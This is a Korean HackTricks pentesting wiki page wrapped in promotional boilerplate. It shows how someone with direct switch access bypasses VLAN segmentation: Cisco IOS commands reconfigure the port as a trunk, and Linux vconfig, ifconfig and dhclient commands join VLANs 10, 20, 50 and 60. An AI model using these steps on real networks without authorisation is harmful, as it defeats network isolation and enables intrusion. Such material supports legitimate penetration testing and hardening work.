# Lateral VLAN Segmentation Bypass

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>

만약 스위치에 직접 액세스할 수 있다면, VLAN 분할을 우회할 수 있습니다. 이는 연결된 포트를 트렁크 모드로 재구성하고 대상 VLAN을 위한 가상 인터페이스를 설정하며, 시나리오에 따라 IP 주소를 동적으로 (DHCP) 또는 정적으로 설정하는 것을 포함합니다 (**자세한 내용은 [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)를 확인하세요).**

먼저, 특정 연결된 포트를 식별해야 합니다. 일반적으로 CDP 메시지를 통해 이를 수행할 수 있으며, 또는 **include** 마스크를 통해 포트를 검색할 수 있습니다.

**CDP가 작동하지 않는 경우, MAC 주소를 검색하여 포트를 식별할 수 있습니다**:
```
SW1(config)# show mac address-table | include 0050.0000.0500
```
트렁크 모드로 전환하기 전에, 기존 VLAN 목록을 작성하고 그들의 식별자를 결정해야 합니다. 이 식별자들은 인터페이스에 할당되어 트렁크를 통해 다양한 VLAN에 접근할 수 있도록 합니다. 예를 들어, 사용 중인 포트는 VLAN 10과 연결되어 있습니다.
```
SW1# show vlan brief
```
**트렁크 모드로 전환하려면 인터페이스 구성 모드로 진입해야 합니다**:
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
트렁크 모드로 전환하면 일시적으로 연결이 중단되지만, 이후에 복구할 수 있습니다.

가상 인터페이스가 생성되고 VLAN ID가 할당되며 활성화됩니다:
```bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
```
그 후 DHCP를 통해 주소 요청이 이루어집니다. DHCP가 적용되지 않을 경우, 주소는 수동으로 구성할 수도 있습니다:
```bash
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
다음은 인터페이스(VLAN 10)에 수동으로 정적 IP 주소를 설정하는 예입니다.
```bash
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
```
VLAN 10, 20, 50, 및 60의 기본 게이트웨이로 ICMP 요청을 시작하여 연결성을 테스트합니다.

최종적으로, 이 프로세스는 VLAN 분할 우회를 가능하게 하여 어떤 VLAN 네트워크에도 제한 없이 액세스할 수 있게 하며, 이후의 작업을 위한 준비를 마칩니다.

## 참고 자료

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 **HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
